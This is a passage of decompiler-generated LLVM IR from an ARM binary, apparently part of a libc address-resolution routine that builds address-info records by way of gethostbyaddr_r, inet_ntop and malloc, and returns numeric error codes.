  br i1 %v2_26fd4, label %dec_label_pc_26fdc, label %dec_label_pc_26ff4

dec_label_pc_26fdc:                               ; preds = %dec_label_pc_26fb4
  %v3_26fe0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26fe0, i32* %r3.global-to-local, align 4
  %v2_26fe4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_26fe4, i32* @r0, align 4
  %v2_26fe8 = inttoptr i32 %v3_26fe0 to i32*
  store i32 %v2_26fe4, i32* %v2_26fe8, align 4
  store i32 28, i32* @r2, align 4
  %v0_26ff0 = call i32 @__GI_memset()
  store i32 %v0_26ff0, i32* %r0.global-to-local, align 4
  %v0_26ff4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_26ff4

dec_label_pc_26ff4:                               ; preds = %dec_label_pc_26fb4, %dec_label_pc_26fdc
  %v0_26ff4 = phi i32 [ %v0_26fd0, %dec_label_pc_26fb4 ], [ %v0_26ff4.pre, %dec_label_pc_26fdc ]
  %v1_26ff4 = add i32 %v0_26ff4, 4
  %v2_26ff4 = inttoptr i32 %v1_26ff4 to i32*
  %v3_26ff4 = load i32, i32* %v2_26ff4, align 4
  store i32 %v3_26ff4, i32* %r3.global-to-local, align 4
  %v7_26ff8 = icmp eq i32 %v3_26ff4, 10
  br i1 %v7_26ff8, label %dec_label_pc_27004, label %bb305

bb305:                                            ; preds = %dec_label_pc_26ff4
  %v3_26ffc = icmp eq i32 %v3_26ff4, 0
  br i1 %v3_26ffc, label %dec_label_pc_27004, label %dec_label_pc_27034

dec_label_pc_27004:                               ; preds = %dec_label_pc_26ff4, %bb305
  %v3_27004 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_27004, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_2700c = add i32 %v3_27004, 4
  %v3_2700c = inttoptr i32 %v2_2700c to i32*
  store i32 10, i32* %v3_2700c, align 4
  %v0_27010 = load i32, i32* @r8, align 4
  %v1_27010 = inttoptr i32 %v0_27010 to i32*
  %v2_27010 = load i32, i32* %v1_27010, align 4
  store i32 %v2_27010, i32* %r3.global-to-local, align 4
  %v1_27014 = urem i32 %v2_27010, 2
  %v2_27014 = icmp eq i32 %v1_27014, 0
  br i1 %v2_27014, label %bb306, label %.thread73

bb306:                                            ; preds = %dec_label_pc_27004
  %v1_2701c = load i32, i32* %r0.global-to-local, align 4
  %v2_2701c = add i32 %v1_2701c, 8
  store i32 %v2_2701c, i32* %r0.global-to-local, align 4
  %v1_27020 = load i32, i32* @sb, align 4
  %v3_27020 = add i32 %v1_27020, -36292
  store i32 %v3_27020, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread73

.thread73:                                        ; preds = %dec_label_pc_27004, %bb306
  store i32 159788, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_27014, i32 ptrtoint (i32* @global_var_25f40.1708 to i32))
  %v3_2702c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_2702c, i32* %r3.global-to-local, align 4
  %v1_27030 = inttoptr i32 %v3_2702c to i32*
  %v2_27030 = load i32, i32* %v1_27030, align 4
  store i32 %v2_27030, i32* @r4, align 4
  %v0_27034.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_27034

dec_label_pc_27034:                               ; preds = %bb305, %.thread73
  %v0_27034 = phi i32 [ %v0_26ff4, %bb305 ], [ %v0_27034.pre, %.thread73 ]
  %v1_27034 = add i32 %v0_27034, 4
  %v2_27034 = inttoptr i32 %v1_27034 to i32*
  %v3_27034 = load i32, i32* %v2_27034, align 4
  store i32 %v3_27034, i32* %r3.global-to-local, align 4
  %v7_27038 = icmp eq i32 %v3_27034, 2
  br i1 %v7_27038, label %dec_label_pc_27044, label %bb307

bb307:                                            ; preds = %dec_label_pc_27034
  %v3_2703c = icmp eq i32 %v3_27034, 0
  br i1 %v3_2703c, label %dec_label_pc_27044, label %.thread75

dec_label_pc_27044:                               ; preds = %dec_label_pc_27034, %bb307
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_27048 = load i32, i32* @r4, align 4
  %v2_27048 = add i32 %v1_27048, 4
  %v3_27048 = inttoptr i32 %v2_27048 to i32*
  store i32 2, i32* %v3_27048, align 4
  %v0_2704c = load i32, i32* @r8, align 4
  %v1_2704c = inttoptr i32 %v0_2704c to i32*
  %v2_2704c = load i32, i32* %v1_2704c, align 4
  store i32 %v2_2704c, i32* %r3.global-to-local, align 4
  %v1_27050 = urem i32 %v2_2704c, 2
  %v2_27050 = icmp eq i32 %v1_27050, 0
  br i1 %v2_27050, label %bb308, label %.thread75

bb308:                                            ; preds = %dec_label_pc_27044
  store i32 16777343, i32* %r3.global-to-local, align 4
  %v2_27058 = load i32, i32* @r4, align 4
  %v3_27058 = add i32 %v2_27058, 8
  %v4_27058 = inttoptr i32 %v3_27058 to i32*
  store i32 16777343, i32* %v4_27058, align 4
  br label %.thread75

.thread75:                                        ; preds = %dec_label_pc_27044, %bb307, %dec_label_pc_26fa0, %bb308
  store i32 %v0_26898812172025, i32* %r3.global-to-local, align 4
  %v2_27060 = icmp eq i32 %v0_26898812172025, 0
  br i1 %v2_27060, label %dec_label_pc_27308, label %dec_label_pc_27068

dec_label_pc_27068:                               ; preds = %.thread75
  %v3_27068 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_27068, i32* @r7, align 4
  %v2_2706c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_2706c, i32* %ip.global-to-local, align 4
  %v2_27070 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_27070, i32* %r0.global-to-local, align 4
  %v2_27074 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_27074, i32* %r1.global-to-local, align 4
  %v2_27078 = ptrtoint i32* %stack_var_-150 to i32
  store i32 %v2_27078, i32* %r2.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v2_272e4114 = icmp eq i32 %v3_27068, 0
  br i1 %v2_272e4114, label %dec_label_pc_27308, label %dec_label_pc_27094.preheader

dec_label_pc_27094.preheader:                     ; preds = %dec_label_pc_27068
  %v2_2717c = icmp eq i32 %v0_268c8, 0
  br label %dec_label_pc_27094

dec_label_pc_27094:                               ; preds = %dec_label_pc_27094.preheader, %dec_label_pc_272e0
  %v0_270ac = phi i32 [ %v2_272e0, %dec_label_pc_272e0 ], [ %v3_27068, %dec_label_pc_27094.preheader ]
  %stack_var_-172.1115 = phi i32 [ %stack_var_-172.0.lcssa, %dec_label_pc_272e0 ], [ %v0_26898812172025, %dec_label_pc_27094.preheader ]
  %v0_27094 = load i32, i32* @r8, align 4
  %v1_27094 = inttoptr i32 %v0_27094 to i32*
  %v2_27094 = load i32, i32* %v1_27094, align 4
  store i32 %v2_27094, i32* %r3.global-to-local, align 4
  %v1_27098 = and i32 %v2_27094, 2
  store i32 %v1_27098, i32* %r0.global-to-local, align 4
  %v2_27098 = icmp eq i32 %v1_27098, 0
  br i1 %v2_27098, label %dec_label_pc_2716c, label %dec_label_pc_270a0

dec_label_pc_270a0:                               ; preds = %dec_label_pc_27094
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v1_270ac = add i32 %v0_270ac, 8
  store i32 %v1_270ac, i32* @r5, align 4
  br label %dec_label_pc_270b0

dec_label_pc_270b0:                               ; preds = %dec_label_pc_27100.dec_label_pc_270b0_crit_edge, %dec_label_pc_270a0
  %v0_270c4 = phi i32 [ %v0_270c4.pre, %dec_label_pc_27100.dec_label_pc_270b0_crit_edge ], [ %v0_270ac, %dec_label_pc_270a0 ]
  %v0_270b0 = phi i32 [ %v0_270b0.pre, %dec_label_pc_27100.dec_label_pc_270b0_crit_edge ], [ 512, %dec_label_pc_270a0 ]
  %v2_270b0 = mul i32 %v0_270b0, 2
  store i32 %v2_270b0, i32* @r4, align 4
  %v1_270b4 = add i32 %v2_270b0, 14
  %v1_270b8 = and i32 %v1_270b4, -8
  store i32 %v1_270b8, i32* %r3.global-to-local, align 4
  %v1_270bc = load i32, i32* @sp, align 4
  %v2_270bc = sub i32 %v1_270bc, %v1_270b8
  %v1_270c0 = add i32 %v2_270bc, 16
  store i32 %v1_270c0, i32* %ip.global-to-local, align 4
  %v1_270c4 = add i32 %v0_270c4, 4
  %v2_270c4 = inttoptr i32 %v1_270c4 to i32*
  %v3_270c4 = load i32, i32* %v2_270c4, align 4
  store i32 %v3_270c4, i32* @r2, align 4
  %v2_270c8 = inttoptr i32 %v2_270bc to i32*
  store i32 %v1_270c0, i32* %v2_270c8, align 4
  %v0_270d0 = load i32, i32* @r2, align 4
  %v7_270d0 = icmp eq i32 %v0_270d0, 10
  %v1_270d4 = load i32, i32* @sp, align 4
  %v2_270d4 = add i32 %v1_270d4, 8
  %v3_270d4 = inttoptr i32 %v2_270d4 to i32*
  store i32 %v2_27070, i32* %v3_270d4, align 4
  store i32 %v2_27074, i32* %ip.global-to-local, align 4
  %. = select i1 %v7_270d0, i32 16, i32 4
  store i32 %., i32* @r1, align 4
  %v0_270e4 = load i32, i32* @r5, align 4
  store i32 %v0_270e4, i32* %r0.global-to-local, align 4
  store i32 %v2_2706c, i32* @r3, align 4
  %v0_270ec = load i32, i32* @r4, align 4
  %v1_270ec = load i32, i32* @sp, align 4
  %v2_270ec = add i32 %v1_270ec, 4
  %v3_270ec = inttoptr i32 %v2_270ec to i32*
  store i32 %v0_270ec, i32* %v3_270ec, align 4
  %v0_270f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_270f0 = load i32, i32* @sp, align 4
  %v2_270f0 = add i32 %v1_270f0, 12
  %v3_270f0 = inttoptr i32 %v2_270f0 to i32*
  store i32 %v0_270f0, i32* %v3_270f0, align 4
  %v1_270f4 = inttoptr i32 %v0_270e4 to i8*
  %v2_270f4 = call i32 @__GI_gethostbyaddr_r(i8* %v1_270f4)
  store i32 %v2_270f4, i32* %r0.global-to-local, align 4
  %v7_270f8 = icmp eq i32 %v2_270f4, 34
  br i1 %v7_270f8, label %dec_label_pc_27100, label %dec_label_pc_27110

dec_label_pc_27100:                               ; preds = %dec_label_pc_270b0
  %v3_27100 = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_27100, i32* %r3.global-to-local, align 4
  %v7_27104 = icmp eq i32 %v3_27100, -1
  br i1 %v7_27104, label %dec_label_pc_27100.dec_label_pc_270b0_crit_edge, label %dec_label_pc_27118

dec_label_pc_27100.dec_label_pc_270b0_crit_edge:  ; preds = %dec_label_pc_27100
  %v0_270b0.pre = load i32, i32* @r4, align 4
  %v0_270c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_270b0

dec_label_pc_27110:                               ; preds = %dec_label_pc_270b0
  %v2_27110 = icmp eq i32 %v2_270f4, 0
  br i1 %v2_27110, label %dec_label_pc_27130, label %dec_label_pc_27110.dec_label_pc_27118_crit_edge

dec_label_pc_27110.dec_label_pc_27118_crit_edge:  ; preds = %dec_label_pc_27110
  %v3_27118.pre = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_27118

dec_label_pc_27118:                               ; preds = %dec_label_pc_27100, %dec_label_pc_27110.dec_label_pc_27118_crit_edge
  %v3_27118 = phi i32 [ %v3_27118.pre, %dec_label_pc_27110.dec_label_pc_27118_crit_edge ], [ %v3_27100, %dec_label_pc_27100 ]
  store i32 %v3_27118, i32* @r0, align 4
  %v3_2711c = icmp eq i32 %v3_27118, -1
  br i1 %v3_2711c, label %dec_label_pc_27124, label %dec_label_pc_27130

dec_label_pc_27124:                               ; preds = %dec_label_pc_27118, %dec_label_pc_26eb4, %dec_label_pc_26d40
  %v0_27124 = call i32 @__set_h_errno()
  store i32 11, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_27130:                               ; preds = %dec_label_pc_27118, %dec_label_pc_27110
  %v3_27130 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_27130, i32* %r0.global-to-local, align 4
  %v2_27134 = icmp eq i32 %v3_27130, 0
  br i1 %v2_27134, label %dec_label_pc_27140, label %bb311

bb311:                                            ; preds = %dec_label_pc_27130
  %v2_27138 = inttoptr i32 %v3_27130 to i32*
  %v3_27138 = load i32, i32* %v2_27138, align 4
  br label %dec_label_pc_27158

dec_label_pc_27140:                               ; preds = %dec_label_pc_27130
  %v0_27140 = load i32, i32* @r7, align 4
  %v1_27140 = add i32 %v0_27140, 4
  %v2_27140 = inttoptr i32 %v1_27140 to i32*
  %v3_27140 = load i32, i32* %v2_27140, align 4
  store i32 %v3_27140, i32* %r0.global-to-local, align 4
  %v1_27144 = add i32 %v0_27140, 8
  store i32 %v1_27144, i32* %r1.global-to-local, align 4
  store i32 %v2_27078, i32* %r2.global-to-local, align 4
  store i32 46, i32* %r3.global-to-local, align 4
  %v4_27150 = call i32 @__GI_inet_ntop(i32 %v3_27140, i32 %v1_27144, i32 %v2_27078, i32 46)
  store i32 %v4_27150, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27158

dec_label_pc_27158:                               ; preds = %bb311, %dec_label_pc_27140
  %storemerge222 = phi i32 [ %v3_27138, %bb311 ], [ %v4_27150, %dec_label_pc_27140 ]
  store i32 %storemerge222, i32* @sl, align 4
  %v2_27158 = icmp eq i32 %storemerge222, 0
  br i1 %v2_27158, label %dec_label_pc_27300, label %dec_label_pc_27160

dec_label_pc_27160:                               ; preds = %dec_label_pc_27158
  %v1_27160 = inttoptr i32 %storemerge222 to i8*
  store i32 %storemerge222, i32* %r0.global-to-local, align 4
  %v3_27164 = call i32 @strlen(i8* %v1_27160)
  %v1_27168 = add i32 %v3_27164, 1
  store i32 %v1_27168, i32* %r0.global-to-local, align 4
  %v0_2716c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2716c

dec_label_pc_2716c:                               ; preds = %dec_label_pc_27094, %dec_label_pc_27160
  %v0_2718893 = phi i32 [ 0, %dec_label_pc_27094 ], [ %v1_27168, %dec_label_pc_27160 ]
  %v0_2719c = phi i32 [ %v0_270ac, %dec_label_pc_27094 ], [ %v0_2716c.pre, %dec_label_pc_27160 ]
  %v1_2716c = add i32 %v0_2719c, 4
  %v2_2716c = inttoptr i32 %v1_2716c to i32*
  %v3_2716c = load i32, i32* %v2_2716c, align 4
  store i32 %v3_2716c, i32* %r3.global-to-local, align 4
  store i32 %v0_268c8, i32* %r1.global-to-local, align 4
  %v7_27174 = icmp eq i32 %v3_2716c, 10
  br i1 %v7_27174, label %.thread78, label %bb312

.thread78:                                        ; preds = %dec_label_pc_2716c
  store i32 1, i32* %r1.global-to-local, align 4
  br label %bb313

bb312:                                            ; preds = %dec_label_pc_2716c
  br i1 %v2_2717c, label %bb314, label %bb313

bb313:                                            ; preds = %.thread78, %bb312
  br label %bb314

bb314:                                            ; preds = %bb312, %bb313
  %storemerge317 = phi i32 [ 28, %bb313 ], [ 16, %bb312 ]
  %storemerge228 = phi i32 [ 10, %bb313 ], [ 2, %bb312 ]
  store i32 %storemerge317, i32* %r2.global-to-local, align 4
  %v1_2718885 = add i32 %v0_2718893, 32
  %storemerge231 = load i32, i32* %stack_var_-52, align 4
  store i32 %storemerge231, i32* @r6, align 4
  store i32 %storemerge228, i32* %ip.global-to-local, align 4
  %v2_27198 = add i32 %storemerge317, %v1_2718885
  store i32 %v2_27198, i32* %r3.global-to-local, align 4
  %v1_2719c = add i32 %v0_2719c, 8
  store i32 %v1_2719c, i32* @sb, align 4
  %v2_272d8111 = icmp eq i32 %storemerge231, 0
  br i1 %v2_272d8111, label %dec_label_pc_272e0, label %dec_label_pc_271b0.lr.ph

dec_label_pc_271b0.lr.ph:                         ; preds = %bb314
  %v1_272a4 = or i32 %storemerge317, 32
  br label %dec_label_pc_271b0

dec_label_pc_271b0:                               ; preds = %dec_label_pc_271b0.lr.ph, %dec_label_pc_272b8
  %stack_var_-172.0112 = phi i32 [ %stack_var_-172.1115, %dec_label_pc_271b0.lr.ph ], [ %v1_272cc, %dec_label_pc_272b8 ]
  store i32 %v2_27198, i32* %r0.global-to-local, align 4
  %v1_271b4 = call i32 @malloc(i32 %v2_27198)
  store i32 %v1_271b4, i32* @r4, align 4
  %v2_271bc = icmp eq i32 %v1_271b4, 0
  store i32 %stack_var_-172.0112, i32* %r0.global-to-local, align 4
  %v2_271c4 = inttoptr i32 %stack_var_-172.0112 to i32*
  store i32 %v1_271b4, i32* %v2_271c4, align 4
  br i1 %v2_271bc, label %dec_label_pc_2730c.loopexit, label %dec_label_pc_271d0

dec_label_pc_271d0:                               ; preds = %dec_label_pc_271b0
  store i32 %storemerge228, i32* %r1.global-to-local, align 4
  %v0_271d4 = load i32, i32* @r8, align 4
  %v1_271d4 = inttoptr i32 %v0_271d4 to i32*
  %v2_271d4 = load i32, i32* %v1_271d4, align 4
  store i32 %v2_271d4, i32* %r3.global-to-local, align 4
  %v1_271d8 = load i32, i32* @r4, align 4
  %v2_271d8 = add i32 %v1_271d8, 4
  %v3_271d8 = inttoptr i32 %v2_271d8 to i32*
  store i32 %storemerge228, i32* %v3_271d8, align 4
  %v0_271dc = load i32, i32* %r3.global-to-local, align 4
  %v1_271dc = load i32, i32* @r4, align 4
  %v2_271dc = inttoptr i32 %v1_271dc to i32*
  store i32 %v0_271dc, i32* %v2_271dc, align 4
  %v0_271e0 = load i32, i32* @r6, align 4
  %v1_271e0 = add i32 %v0_271e0, 4
  %v2_271e0 = inttoptr i32 %v1_271e0 to i32*
  %v3_271e0 = load i32, i32* %v2_271e0, align 4
  store i32 %v3_271e0, i32* %r3.global-to-local, align 4
  %v1_271e4 = load i32, i32* @r4, align 4
  %v2_271e4 = add i32 %v1_271e4, 8
  %v3_271e4 = inttoptr i32 %v2_271e4 to i32*
  store i32 %v3_271e0, i32* %v3_271e4, align 4
  store i32 %storemerge317, i32* %r2.global-to-local, align 4
  %v0_271ec = load i32, i32* @r6, align 4
  %v1_271ec = add i32 %v0_271ec, 8
  %v2_271ec = inttoptr i32 %v1_271ec to i32*
  %v3_271ec = load i32, i32* %v2_271ec, align 4
  store i32 %v3_271ec, i32* @r3, align 4
  %v0_271f0 = load i32, i32* @r4, align 4
  %v1_271f0 = add i32 %v0_271f0, 32
  store i32 %v1_271f0, i32* @r5, align 4
  %v0_271f4 = load i32, i32* %r1.global-to-local, align 4
  %v7_271f4 = icmp eq i32 %v0_271f4, 10
  %v2_271f8 = add i32 %v0_271f0, 12
  %v3_271f8 = inttoptr i32 %v2_271f8 to i32*
  store i32 %v3_271ec, i32* %v3_271f8, align 4
  %v0_271fc = load i32, i32* %r2.global-to-local, align 4
  %v1_271fc = load i32, i32* @r4, align 4
  %v2_271fc = add i32 %v1_271fc, 16
  %v3_271fc = inttoptr i32 %v2_271fc to i32*
  store i32 %v0_271fc, i32* %v3_271fc, align 4
  %v0_27200 = load i32, i32* @r5, align 4
  %v1_27200 = load i32, i32* @r4, align 4
  %v2_27200 = add i32 %v1_27200, 20
  %v3_27200 = inttoptr i32 %v2_27200 to i32*
  store i32 %v0_27200, i32* %v3_27200, align 4
  %v0_27204 = load i32, i32* %r1.global-to-local, align 4
  %v1_27204 = trunc i32 %v0_27204 to i16
  %v2_27204 = load i32, i32* @r4, align 4
  %v3_27204 = add i32 %v2_27204, 32
  %v4_27204 = inttoptr i32 %v3_27204 to i16*
  store i16 %v1_27204, i16* %v4_27204, align 2
  br i1 %v7_271f4, label %dec_label_pc_2720c, label %dec_label_pc_27264

dec_label_pc_2720c:                               ; preds = %dec_label_pc_271d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_27210 = load i32, i32* @r5, align 4
  %v2_27210 = add i32 %v1_27210, 4
  %v3_27210 = inttoptr i32 %v2_27210 to i32*
  store i32 0, i32* %v3_27210, align 4
  %v0_27214 = load i32, i32* @r7, align 4
  %v1_27214 = add i32 %v0_27214, 4
  %v2_27214 = inttoptr i32 %v1_27214 to i32*
  %v3_27214 = load i32, i32* %v2_27214, align 4
  store i32 %v3_27214, i32* @r3, align 4
  %v7_27218 = icmp eq i32 %v3_27214, 10
  br i1 %v7_27218, label %.thread97, label %dec_label_pc_2722c

.thread97:                                        ; preds = %dec_label_pc_2720c
  %v1_2721c = load i32, i32* @r4, align 4
  %v2_2721c = add i32 %v1_2721c, 40
  br label %dec_label_pc_2724c

dec_label_pc_2722c:                               ; preds = %dec_label_pc_2720c
  store i32 -65536, i32* @r3, align 4
  store i32 0, i32* @ip, align 4
  %v1_27234 = load i32, i32* @r5, align 4
  %v2_27234 = add i32 %v1_27234, 8
  %v3_27234 = inttoptr i32 %v2_27234 to i32*
  store i32 0, i32* %v3_27234, align 4
  %v0_27238 = load i32, i32* @ip, align 4
  %v1_27238 = load i32, i32* @r5, align 4
  %v2_27238 = add i32 %v1_27238, 12
  %v3_27238 = inttoptr i32 %v2_27238 to i32*
  store i32 %v0_27238, i32* %v3_27238, align 4
  %v0_2723c = load i32, i32* @r3, align 4
  %v1_2723c = load i32, i32* @r5, align 4
  %v2_2723c = add i32 %v1_2723c, 16
  %v3_2723c = inttoptr i32 %v2_2723c to i32*
  store i32 %v0_2723c, i32* %v3_2723c, align 4
  %v0_27240 = load i32, i32* @r4, align 4
  %v1_27240 = add i32 %v0_27240, 52
  br label %dec_label_pc_2724c

dec_label_pc_2724c:                               ; preds = %.thread97, %dec_label_pc_2722c
  %storemerge230 = phi i32 [ %v1_27240, %dec_label_pc_2722c ], [ %v2_2721c, %.thread97 ]
  %storemerge223 = phi i32 [ 4, %dec_label_pc_2722c ], [ 16, %.thread97 ]
  store i32 %storemerge230, i32* @r0, align 4
  %storemerge224 = load i32, i32* @sb, align 4
  store i32 %storemerge224, i32* @r1, align 4
  store i32 %storemerge223, i32* @r2, align 4
  %v0_2724c = call i32 @memcpy()
  store i32 %v0_2724c, i32* %r0.global-to-local, align 4
  %v0_27250 = load i32, i32* @r6, align 4
  %v1_27250 = add i32 %v0_27250, 12
  %v2_27250 = inttoptr i32 %v1_27250 to i16*
  %v3_27250 = load i16, i16* %v2_27250, align 2
  %v4_27250 = zext i16 %v3_27250 to i32
  store i32 %v4_27250, i32* %ip.global-to-local, align 4
  %v0_27254 = load i32, i32* @r7, align 4
  %v1_27254 = add i32 %v0_27254, 24
  %v2_27254 = inttoptr i32 %v1_27254 to i32*
  %v3_27254 = load i32, i32* %v2_27254, align 4
  store i32 %v3_27254, i32* %r3.global-to-local, align 4
  %v2_27258 = load i32, i32* @r5, align 4
  %v3_27258 = add i32 %v2_27258, 2
  %v4_27258 = inttoptr i32 %v3_27258 to i16*
  store i16 %v3_27250, i16* %v4_27258, align 2
  %v0_2725c = load i32, i32* %r3.global-to-local, align 4
  %v1_2725c = load i32, i32* @r5, align 4
  %v2_2725c = add i32 %v1_2725c, 24
  %v3_2725c = inttoptr i32 %v2_2725c to i32*
  store i32 %v0_2725c, i32* %v3_2725c, align 4
  br label %dec_label_pc_2728c

dec_label_pc_27264:                               ; preds = %dec_label_pc_271d0
  %v0_27264 = load i32, i32* @sb, align 4
  store i32 %v0_27264, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_2726c = load i32, i32* @r4, align 4
  %v1_2726c = add i32 %v0_2726c, 36
  store i32 %v1_2726c, i32* @r0, align 4
  %v0_27270 = call i32 @memcpy()
  store i32 %v0_27270, i32* %r0.global-to-local, align 4
  %v0_27274 = load i32, i32* @r6, align 4
  %v1_27274 = add i32 %v0_27274, 12
  %v2_27274 = inttoptr i32 %v1_27274 to i16*
  %v3_27274 = load i16, i16* %v2_27274, align 2
  %v4_27274 = zext i16 %v3_27274 to i32
  store i32 %v4_27274, i32* %r3.global-to-local, align 4
  %v0_27278 = load i32, i32* @r4, align 4
  %v1_27278 = add i32 %v0_27278, 40
  store i32 %v1_27278, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v2_27284 = load i32, i32* @r5, align 4
  %v3_27284 = add i32 %v2_27284, 2
  %v4_27284 = inttoptr i32 %v3_27284 to i16*
  store i16 %v3_27274, i16* %v4_27284, align 2
  %v0_27288 = call i32 @__GI_memset()
  store i32 %v0_27288, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2728c

dec_label_pc_2728c:                               ; preds = %dec_label_pc_2724c, %dec_label_pc_27264
  store i32 %stack_var_-172.0112, i32* %ip.global-to-local, align 4
  %v2_27290 = load i32, i32* %v2_271c4, align 4
  store i32 %v2_27290, i32* %r3.global-to-local, align 4
  %v0_27294 = load i32, i32* @sl, align 4
  %v2_27294 = icmp eq i32 %v0_27294, 0
  %v3_27298 = add i32 %v2_27290, 24
  %v4_27298 = inttoptr i32 %v3_27298 to i32*
  br i1 %v2_27294, label %bb315, label %dec_label_pc_272a0

bb315:                                            ; preds = %dec_label_pc_2728c
  store i32 0, i32* %v4_27298, align 4
  br label %dec_label_pc_272b8

dec_label_pc_272a0:                               ; preds = %dec_label_pc_2728c
  %v2_272a8 = add i32 %v2_27290, %v1_272a4
  store i32 %v2_272a8, i32* %r0.global-to-local, align 4
  store i32 %v2_272a8, i32* %v4_27298, align 4
  %v0_272b0 = load i32, i32* @sl, align 4
  store i32 %v0_272b0, i32* @r1, align 4
  %v2_272b4 = inttoptr i32 %v2_272a8 to i8*
  %v3_272b4 = call i32 @strcpy(i8* %v2_272b4, i32 %v0_272b0)
  store i32 %v3_272b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_272b8

dec_label_pc_272b8:                               ; preds = %bb315, %dec_label_pc_272a0
  store i32 %stack_var_-172.0112, i32* %r2.global-to-local, align 4
  %v2_272bc = load i32, i32* %v2_271c4, align 4
  store i32 %v2_272bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_272c4 = add i32 %v2_272bc, 28
  %v3_272c4 = inttoptr i32 %v2_272c4 to i32*
  store i32 0, i32* %v3_272c4, align 4
  %v0_272c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_272c8 = inttoptr i32 %v0_272c8 to i32*
  %v2_272c8 = load i32, i32* %v1_272c8, align 4
  %v1_272cc = add i32 %v2_272c8, 28
  store i32 %v1_272cc, i32* %r3.global-to-local, align 4
  %v0_272d0 = load i32, i32* @r6, align 4
  %v1_272d0 = inttoptr i32 %v0_272d0 to i32*
  %v2_272d0 = load i32, i32* %v1_272d0, align 4
  store i32 %v2_272d0, i32* @r6, align 4
  %v2_272d8 = icmp eq i32 %v2_272d0, 0
  br i1 %v2_272d8, label %dec_label_pc_272d8.dec_label_pc_272e0_crit_edge, label %dec_label_pc_271b0

dec_label_pc_272d8.dec_label_pc_272e0_crit_edge:  ; preds = %dec_label_pc_272b8
  %v0_272e0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_272e0

dec_label_pc_272e0:                               ; preds = %dec_label_pc_272d8.dec_label_pc_272e0_crit_edge, %bb314
  %v0_272e0 = phi i32 [ %v0_272e0.pre, %dec_label_pc_272d8.dec_label_pc_272e0_crit_edge ], [ %v0_2719c, %bb314 ]
  %stack_var_-172.0.lcssa = phi i32 [ %v1_272cc, %dec_label_pc_272d8.dec_label_pc_272e0_crit_edge ], [ %stack_var_-172.1115, %bb314 ]
  %v1_272e0 = inttoptr i32 %v0_272e0 to i32*
  %v2_272e0 = load i32, i32* %v1_272e0, align 4
  store i32 %v2_272e0, i32* @r7, align 4
  %v2_272e4 = icmp eq i32 %v2_272e0, 0
  br i1 %v2_272e4, label %dec_label_pc_27308, label %dec_label_pc_27094

dec_label_pc_272f0:                               ; preds = %dec_label_pc_2694c, %dec_label_pc_26a50, %dec_label_pc_26974
  store i32 264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_272f8:                               ; preds = %bb287, %dec_label_pc_26b90
  store i32 6, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_27300:                               ; preds = %dec_label_pc_27158, %dec_label_pc_26fa0, %dec_label_pc_26c80
  store i32 258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_27308:                               ; preds = %dec_label_pc_272e0, %dec_label_pc_27068, %.thread75
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_2730c.loopexit:                      ; preds = %dec_label_pc_271b0
  store i32 10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_2730c:                               ; preds = %dec_label_pc_26a38, %bb275, %bb304, %dec_label_pc_2730c.loopexit, %.thread68, %.thread67, %dec_label_pc_269a0, %dec_label_pc_27300, %dec_label_pc_272f8, %dec_label_pc_272f0, %dec_label_pc_27124, %dec_label_pc_27308
  %v1_27314 = phi i32 [ 10, %dec_label_pc_2730c.loopexit ], [ 259, %.thread68 ], [ 3, %.thread67 ], [ 259, %bb304 ], [ %v1_269b8, %dec_label_pc_269a0 ], [ 263, %bb275 ], [ 258, %dec_label_pc_27300 ], [ 6, %dec_label_pc_272f8 ], [ 264, %dec_label_pc_272f0 ], [ 11, %dec_label_pc_27124 ], [ 0, %dec_label_pc_27308 ], [ %v4_26a24, %dec_label_pc_26a38 ]
  store i32 %v12_2687c, i32* %r7.global-to-local, align 4
  ret i32 %v1_27314

; uselistorder directives
  uselistorder i32 %v2_272e0, { 1, 2, 0 }
  uselistorder i32 %v1_272cc, { 0, 2, 1 }
  uselistorder i32 %stack_var_-172.0112, { 3, 2, 0, 1 }
  uselistorder i32 %storemerge231, { 1, 0 }
  uselistorder i32 %storemerge317, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge222, { 2, 1, 0, 3 }
  uselistorder i32 %v3_27118, { 1, 0 }
  uselistorder i32 %v3_27100, { 1, 0, 2 }
  uselistorder i32 %v2_270b0, { 1, 0 }
  uselistorder i32 %v2_27078, { 1, 0, 2 }
